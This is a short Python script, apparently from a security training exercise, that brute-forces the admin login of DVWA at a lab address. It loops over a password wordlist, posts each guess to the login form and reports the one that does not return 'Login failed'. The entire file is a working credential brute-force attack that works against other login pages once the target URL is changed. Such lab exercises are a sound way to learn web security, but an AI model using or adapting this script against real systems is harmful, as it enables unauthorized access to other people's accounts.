#!/usr/bin/env python

import requests

target_url = "http://10.0.2.20/dvwa/login.php"
data_to_submit = {"username" : "admin", "password" : "", "Login" : "submit"}


with open("password.txt","r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_to_submit["password"] = word
        response = requests.post(target_url, data=data_to_submit)
        if "Login failed" not in response.content:
            print("[+] Got the password ---> "+ word)
            exit()

print("[+] Reached end of line.")
